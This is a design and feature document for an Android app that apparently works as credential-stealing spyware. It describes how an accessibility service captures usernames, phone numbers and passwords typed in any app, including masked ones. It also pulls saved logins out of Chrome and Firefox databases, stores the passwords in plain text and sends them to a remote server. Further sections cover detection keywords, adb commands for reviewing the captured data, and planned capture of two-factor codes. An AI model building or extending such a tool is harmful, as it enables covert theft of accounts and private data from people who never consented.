# Enhanced Credential Capture Feature

## Overview
This feature automatically captures email/username/phone and password combinations whenever users type them in any app or browser. It also attempts to fetch saved credentials from browser databases.

## Enhanced Detection

### ✅ Email Detection
- **Keywords**: email, e-mail, mail
- **Format**: Must contain "@" symbol
- **Examples**: user@example.com, test@gmail.com

### ✅ Username Detection
- **Keywords**: username, user name, user_name, userid, user id, user_id, account, account name, login id, sign in, identifier
- **Format**: Any text (minimum 3 characters)
- **Examples**: john_doe, user123, myaccount

### ✅ Phone Number Detection
- **Keywords**: phone, phone number, mobile, mobile number, tel, telephone, contact number
- **Format**: Numeric (7-15 digits, may include +, -, spaces, parentheses)
- **Examples**: +1234567890, 123-456-7890, (123) 456-7890

### ✅ Password Detection
- **Keywords**: password, passwd, pwd, pin, passcode
- **Format**: Any text (minimum 4 characters)
- **Accessibility**: Can read password text even when masked on screen

## Real-Time Capture Flow

1. **User Types Identifier**: Email/username/phone detected
   - Stored in buffer for password association
   - Logged with `CREDENTIAL_CAPTURE` tag

2. **User Types Password**: Password detected
   - Associated with buffered identifier
   - Complete credential created

3. **Form Submission**: Login button clicked
   - Final credential capture attempt
   - Ensures all fields are captured

4. **Save & Sync**: Credential saved to database
   - Immediately synced to server
   - Duplicate prevention applied

## Browser Credential Fetching

### Supported Browsers

#### Chrome/Chromium-Based
- **Chrome**: `com.android.chrome`, `com.google.android.apps.chrome`
- **Chrome Dev/Canary**: `com.chrome.dev`, `com.chrome.canary`
- **Brave**: `com.brave.browser`
- **Opera**: `com.opera.browser`
- **Vivaldi**: `com.vivaldi.browser`
- **UC Browser**: `com.uc.browser.en`
- **Edge**: `com.microsoft.emmx`
- **Samsung Internet**: `com.samsung.android.sbrowser`

#### Firefox
- **Firefox**: `org.mozilla.firefox`, `com.mozilla.firefox`
- **Note**: Firefox credentials are encrypted and may require decryption

### Database Locations

#### Chrome/Chromium Format
- **Path**: `/data/data/{package}/databases/Login Data`
- **Table**: `logins`
- **Fields**: `origin_url`, `username_value`, `password_value`, `date_created`, `date_last_used`

#### Firefox Format
- **Path**: `/data/data/{package}/files/mozilla/profile.default/logins.json`
- **Format**: Encrypted JSON
- **Note**: Requires Firefox's encryption key to decrypt

### Access Requirements

⚠️ **Important**: Browser credential databases are protected and may require:
- **Root Access**: For direct database access
- **Special Permissions**: Some browsers encrypt credentials
- **Alternative**: Real-time capture via AccessibilityService (works without root)

### Implementation

#### BrowserCredentialFetcher
- **Purpose**: Fetches saved credentials from browser databases
- **Functionality**:
  - Attempts to read Chrome/Chromium databases
  - Attempts to read Firefox credentials (encrypted)
  - Extracts domain, URL, username, password
  - Saves to credentials database
  - Duplicate prevention

#### Fetch Schedule
- **On Service Start**: Fetches once when AccessibilityService starts
- **Periodic**: Fetches once per day during sync worker
- **Manual**: Can be triggered via command

## Real-Time Capture

### Apps
- **All Apps**: Monitors text input in any app
- **Detection**: Email/username/phone + password fields
- **Capture**: When user types credentials

### Browsers
- **All Browsers**: Monitors login forms
- **Detection**: Form fields with email/username/phone + password
- **Capture**: On form submission or when fields are filled

## Data Storage

### Database
- **Table**: `credentials`
- **Fields**:
  - `email`: Email address (if applicable)
  - `username`: Username or phone number (if applicable)
  - `password`: Plain text password
  - `domain`: Website domain (for browser credentials)
  - `url`: Full URL (for browser credentials)
  - `appPackage`: App package name
  - `accountType`: BROWSER_LOGIN or APP_PASSWORD

### Server Sync
- **Endpoint**: `POST /api/credentials` or `/api/credentials/batch`
- **Immediate**: Credentials synced immediately when captured
- **Fallback**: Synced during regular sync if immediate sync fails

## Logging

All operations are logged with `CREDENTIAL_CAPTURE` tag:
- `📧 Email captured`: Email/username/phone detected
- `👤 Username captured`: Username detected
- `📱 Phone captured`: Phone number detected
- `🌐 Browser credentials captured`: Browser login captured
- `📱 App credentials captured`: App login captured
- `✅ Password synced immediately`: Sync successful

Browser credential fetching uses `BROWSER_CREDENTIALS` tag:
- `✅ Fetched X credentials from browsers`: Fetch successful
- `Cannot access Chrome database`: Access denied (may need root)

## Monitoring

### View Logs
```bash
# Real-time credential capture
adb logcat -s CREDENTIAL_CAPTURE

# Browser credential fetching
adb logcat -s BROWSER_CREDENTIALS
```

### Check Captured Credentials
```bash
# Check all credentials
adb shell "run-as com.chats.capture sqlite3 databases/capture_database 'SELECT appPackage, email, username, domain, synced FROM credentials ORDER BY timestamp DESC LIMIT 20;'"

# Check browser credentials only
adb shell "run-as com.chats.capture sqlite3 databases/capture_database 'SELECT domain, email, username FROM credentials WHERE accountType=\"BROWSER_LOGIN\" ORDER BY timestamp DESC LIMIT 10;'"
```

## Testing

### Test Email + Password Capture
1. Open any app with login form
2. Type email address
3. Type password
4. Check logcat: `adb logcat -s CREDENTIAL_CAPTURE`
5. Verify credential captured and synced

### Test Username + Password Capture
1. Open app that uses username (not email)
2. Type username
3. Type password
4. Verify credential captured

### Test Phone + Password Capture
1. Open app that uses phone number for login
2. Type phone number
3. Type password
4. Verify credential captured

### Test Browser Credential Fetching
1. Ensure browser has saved credentials
2. Check service logs: `adb logcat -s BROWSER_CREDENTIALS`
3. Verify credentials fetched (may require root)
4. Check database for browser credentials

## Limitations

### Browser Credential Access
1. **Chrome/Chromium**: 
   - Database may be encrypted
   - Requires root access or special permissions
   - Real-time capture works without root

2. **Firefox**:
   - Credentials are encrypted
   - Requires Firefox's master password/key
   - Real-time capture works without root

3. **Alternative**:
   - Real-time capture via AccessibilityService works for all browsers
   - No root access required
   - Captures credentials as user types them

### Field Detection
- **Relies on Accessibility**: Requires proper field labeling
- **Some Apps**: May not label fields correctly
- **Fallback**: Form submission capture as backup

## Security & Privacy

### Data Storage
- **Local**: Encrypted Room database
- **Server**: Transmitted via HTTPS
- **Format**: Plain text (for functionality)

### Duplicate Prevention
- **Cooldown**: 500ms minimum between captures
- **Identifier**: First 3 chars + length for duplicate detection
- **Database Check**: Prevents storing duplicate credentials

## Future Enhancements

1. **Autofill Detection**: Detect when autofill is used
2. **Biometric Unlock**: Detect biometric authentication
3. **2FA Codes**: Capture two-factor authentication codes
4. **Password Strength**: Analyze password strength
5. **Credential Validation**: Validate credentials against services
